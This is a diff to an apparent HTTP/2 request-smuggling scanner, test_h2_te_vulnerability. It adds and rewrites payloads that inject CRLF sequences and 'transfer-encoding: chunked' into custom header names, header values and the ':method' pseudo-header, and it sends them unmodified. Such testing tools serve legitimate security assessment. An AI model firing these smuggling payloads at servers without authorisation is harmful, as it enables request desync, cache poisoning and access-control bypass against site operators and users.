@@ -107,7 +107,6 @@ async def test_h2_te_vulnerability(
             ("accept-encoding", "gzip, deflate, br"),
             ("accept-language", "en-US;q=0.9,en;q=0.8"),
             ("cache-control", "max-age=0"),
-            ("content-type", "application/x-www-form-urlencoded"),
         ]
         
         # Add custom headers if provided
@@ -145,17 +144,24 @@ async def test_h2_te_vulnerability(
             },
             # 2. In custom header value
             {
-                "description": "Transfer-Encoding in custom header value",
+                "description": "H2.TE via Request Header Injection in Custom Header Value",
                 "header_name": "x-custom",
                 "header_value": "foo\r\ntransfer-encoding: chunked",
                 "type": "custom_header_value"
             },
             # 3. In custom header name
             {
-                "description": "Transfer-Encoding in custom header name",
+                "description": "H2.TE via Request Header Injection in Custom Header Name",
                 "header_name": "x-custom:foo\r\ntransfer-encoding",
                 "header_value": "chunked",
                 "type": "custom_header_name"
+            },
+            # 4. In Request line 
+            {
+                "description": "H2.TE via Request Line Injection",
+                "header_name": ":method",
+                "header_value": "POST / HTTP/1.1\r\nTransfer-encoding: chunked\r\nx: x",
+                "type": "request_line"
             }
         ]
         
@@ -223,10 +229,13 @@ async def test_h2_te_vulnerability(
                         
                     elif payload_placement == "custom_header_value":
                         # Transfer-Encoding in a custom header value position
-                        test_headers.append(("X-Test", f"{header_name}: {header_value}"))
+                        test_headers.append((header_name, header_value))
                     elif payload_placement == "custom_header_name":
                         # Transfer-Encoding in a custom header name position
-                        test_headers.append((f"{header_name}: {header_value}", "smuggled"))
+                        test_headers.append((header_name, header_value))
+                    elif payload_placement == "request_line":
+                        # Transfer-Encoding in request line
+                        test_headers.append((header_name, header_value))
                     
                     # Record start time
                     start_time = time.time()
